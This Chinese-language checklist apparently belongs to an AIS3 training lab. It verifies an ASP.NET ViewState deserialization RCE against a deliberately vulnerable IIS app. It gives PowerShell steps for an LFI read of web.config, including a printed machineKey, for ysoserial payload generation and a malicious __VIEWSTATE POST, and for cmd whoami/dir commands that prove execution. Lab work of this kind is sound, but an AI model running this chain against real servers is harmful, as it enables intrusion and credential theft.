# 完整 RCE 验证检查清单

## 🎯 目标

验证修复后的 report.aspx 能够正确触发 ViewState 反序列化 RCE 漏洞。

---

## ✅ 检查清单

### 【代码修改验证】

- [ ] **报告.aspx 添加了 GridView**
  - 检查：`Get-Content "C:\inetpub\wwwroot\VulnerableApp\report.aspx" | Select-String "GridView"`
  - 预期：找到 `<asp:GridView ID="gvHiddenData"`

- [ ] **Page 指令启用了 ViewState**
  - 检查：查看第一行 `<%@ Page Language="C#" EnableViewState="true" ...`
  - 预期：包含 `EnableViewState="true"` 和 `ViewStateEncryptionMode="Always"`

- [ ] **GridView 设置了 EnableViewState**
  - 检查：`EnableViewState="true"` 在 GridView 标签中
  - 预期：确认存在

---

### 【部署验证】

- [ ] **代码已从 GitHub 更新**
  ```powershell
  cd "C:\Users\user\Desktop\AIS3_IIS_ASP.NET_Deserialization2RCE"
  git log --oneline | head -3
  ```
  预期输出：最新提交应该是"Fix: Add GridView..."

- [ ] **文件已复制到 IIS**
  ```powershell
  ls "C:\inetpub\wwwroot\VulnerableApp\report.aspx" -File
  ```
  预期：文件存在且最近修改时间是最新的

- [ ] **IIS 应用池已重启**
  ```powershell
  iisreset /status
  ```
  预期：应用池处于运行状态

---

### 【功能验证】

- [ ] **页面返回 HTTP 200**
  ```powershell
  $response = Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" -UseBasicParsing
  Write-Host "Status: $($response.StatusCode)"
  ```
  预期：200

- [ ] **ViewState 长度增加（关键！）**
  ```powershell
  $response = Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" -UseBasicParsing
  if ($response.Content -match '__VIEWSTATE" value="([^"]+)"') {
      $viewstate = $matches[1]
      Write-Host "ViewState 长度: $($viewstate.Length) 字符"
  }
  ```
  预期：**200+ 字符**（比修改前的 ~100 字符长）

- [ ] **GridView 在源代码中存在**
  ```powershell
  $response.Content -match "gvHiddenData"
  ```
  预期：true

- [ ] **__VIEWSTATEGENERATOR 存在**
  ```powershell
  $response.Content -match "__VIEWSTATEGENERATOR"
  ```
  预期：true

---

### 【LFI 验证（确保仍然有效）】

- [ ] **download.aspx 仍然返回 HTTP 200**
  ```powershell
  $resp = Invoke-WebRequest "http://10.41.53.120/download.aspx?file=web.config" -UseBasicParsing
  $resp.StatusCode
  ```
  预期：200

- [ ] **能读取 web.config**
  ```powershell
  $resp = Invoke-WebRequest "http://10.41.53.120/download.aspx?file=C:\inetpub\wwwroot\VulnerableApp\web.config" -UseBasicParsing
  $resp.Content -match "machineKey"
  ```
  预期：true

- [ ] **machineKey 值正确**
  ```powershell
  $resp.Content -match 'validationKey="([^"]+)"'
  $matches[1]  # 应该是 719B829E1103FBAAFC74A4083971E6022F15407E693470E498CCBD6D7BE489FE
  ```
  预期：匹配

---

### 【Payload 生成验证】

- [ ] **ysoserial.exe 存在且可运行**
  ```powershell
  & "C:\Users\user\Downloads\ysoserial-new\Release\ysoserial.exe" --help | head -5
  ```
  预期：显示帮助信息

- [ ] **Payload 生成成功**
  ```powershell
  $payload_size = [System.IO.File]::ReadAllBytes("$env:TEMP\exploit.bin").Length
  Write-Host "Payload size: $payload_size bytes"
  ```
  预期：**1500+ 字节**

- [ ] **Payload Base64 编码正确**
  ```powershell
  $payloadBinary = [System.IO.File]::ReadAllBytes("$env:TEMP\exploit.bin")
  $payloadBase64 = [System.Convert]::ToBase64String($payloadBinary)
  Write-Host "Base64 length: $($payloadBase64.Length)"
  ```
  预期：**2000+ 字符**

---

### 【RCE 触发验证】

- [ ] **POST 请求已发送**
  ```powershell
  $body = @{
      "__VIEWSTATE" = $payloadBase64
      "txtReportName" = "test"
      "txtReportDate" = "2024-01-01"
  }
  Invoke-WebRequest -Uri "http://10.41.53.120/report.aspx" -Method POST -Body $body -ErrorAction SilentlyContinue
  ```
  预期：请求完成（可能返回错误，但请求已发送）

- [ ] **等待命令执行**
  ```powershell
  Start-Sleep -Seconds 3
  ```
  预期：等待完成

---

### 【RCE 成功验证】⭐ **最关键！**

- [ ] **pwned.txt 文件已创建**
  ```powershell
  Test-Path "C:\inetpub\wwwroot\VulnerableApp\pwned.txt"
  ```
  预期：**true**

- [ ] **pwned.txt 包含命令输出**
  ```powershell
  Get-Content "C:\inetpub\wwwroot\VulnerableApp\pwned.txt"
  ```
  预期：**输出应该包含 IIS App Pool 身份**，比如：
  ```
  IISAPPPOOL\VULNERABLEAPPPOOL
  ```

- [ ] **通过 HTTP 也能访问**
  ```powershell
  $result = Invoke-WebRequest "http://10.41.53.120/pwned.txt" -UseBasicParsing
  $result.Content
  ```
  预期：同上

---

### 【多次测试验证】

**第 1 次测试：**
- [ ] 删除之前的 pwned.txt
  ```powershell
  rm "C:\inetpub\wwwroot\VulnerableApp\pwned.txt" -ErrorAction SilentlyContinue
  ```

- [ ] 重新生成 payload 并发送
- [ ] 验证 pwned.txt 被重新创建
- [ ] 记录时间戳

**第 2 次测试（确保重复性）：**
- [ ] 再次删除 pwned.txt
- [ ] 用不同的命令重新生成 payload
  ```powershell
  $command = 'cmd /c echo "RCE Success - ' + (Get-Date) + '" > C:\inetpub\wwwroot\VulnerableApp\pwned2.txt'
  ```
- [ ] 发送新的 payload
- [ ] 验证 pwned2.txt 被创建
- [ ] 检查时间戳是否不同

**第 3 次测试（验证命令执行）：**
- [ ] 创建一个可执行命令来验证身份
  ```powershell
  $command = 'cmd /c whoami > C:\inetpub\wwwroot\VulnerableApp\pwned_whoami.txt && dir C:\ >> C:\inetpub\wwwroot\VulnerableApp\pwned_dir.txt'
  ```
- [ ] 验证两个文件都被创建
- [ ] 检查输出内容

---

## 📊 测试结果汇总表

| 验证项 | 预期 | 实际 | 状态 | 备注 |
|--------|------|------|------|------|
| GridView 添加 | ✅ | | ✅/❌ | |
| Page 指令 | ✅ | | ✅/❌ | |
| 文件部署 | ✅ | | ✅/❌ | |
| HTTP 200 | ✅ | | ✅/❌ | |
| __VIEWSTATE 长度 | 200+ | | ✅/❌ | |
| LFI 工作 | ✅ | | ✅/❌ | |
| machineKey 正确 | ✅ | | ✅/❌ | |
| Payload 生成 | 1500+ 字节 | | ✅/❌ | |
| POST 发送 | ✅ | | ✅/❌ | |
| **pwned.txt 创建** | **✅** | | **✅/❌** | **关键！** |
| **pwned.txt 内容** | **IISAPPPOOL\\...** | | **✅/❌** | **关键！** |

---

## 🚨 如果测试失败

### 场景 1：pwned.txt 未创建

**可能原因：**
1. Payload 格式不对
2. GridView 没有被加载
3. __VIEWSTATE 长度仍然太短

**检查步骤：**
```powershell
# 1. 确认 __VIEWSTATE 长度
$resp = Invoke-WebRequest "http://10.41.53.120/report.aspx" -UseBasicParsing
if ($resp.Content -match '__VIEWSTATE" value="([^"]+)"') {
    Write-Host "Current ViewState length: $($matches[1].Length)"
}

# 2. 确认 GridView 在源代码中
$resp.Content -match "gvHiddenData" ? "✅ GridView found" : "❌ GridView NOT found"

# 3. 检查 IIS 日志
Get-Content "C:\inetpub\logs\LogFiles\W3SVC1\*.log" -Tail 50
```

### 场景 2：页面返回 Runtime Error

**可能原因：**
1. web.config 配置有问题
2. ASP.NET 编译缓存需要清除
3. 权限问题

**解决方案：**
```powershell
# 清除 ASP.NET 临时文件
rm "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET Files\*" -Recurse -Force

# 重启 IIS
iisreset /restart

# 等待 2 分钟后重试
Start-Sleep -Seconds 120
```

### 场景 3：Payload 生成失败

**检查：**
```powershell
# 确认 ysoserial 路径
Test-Path "C:\Users\user\Downloads\ysoserial-new\Release\ysoserial.exe"

# 手动运行看错误
& "C:\Users\user\Downloads\ysoserial-new\Release\ysoserial.exe" -h
```

---

## 🎓 完整流程总结

```
【修改代码】
  ↓
【提交到 GitHub】
  ↓
【在 Windows Server 上】
  ├─ git pull（获取最新代码）
  ├─ 复制文件到 IIS
  ├─ 重启应用池
  ├─ 验证 __VIEWSTATE 长度增加 ← 关键！
  ├─ 验证 LFI 仍然工作
  ├─ 生成恶意 payload
  ├─ POST 到 report.aspx
  └─ 🎉 验证 pwned.txt 创建 ← RCE 成功！
```

---

## ✅ 最终验收标准

| 项目 | 标准 | 状态 |
|------|------|------|
| **代码修改** | GridView 已添加 | ✅/❌ |
| **文件部署** | report.aspx 已更新 | ✅/❌ |
| **页面功能** | HTTP 200 + __VIEWSTATE 长度 > 200 | ✅/❌ |
| **LFI 功能** | 能读取 web.config | ✅/❌ |
| **Payload 生成** | >1500 字节 | ✅/❌ |
| **RCE 执行** | **pwned.txt 已创建** | **✅** |

**所有项目都必须为 ✅ 才能视为成功！**

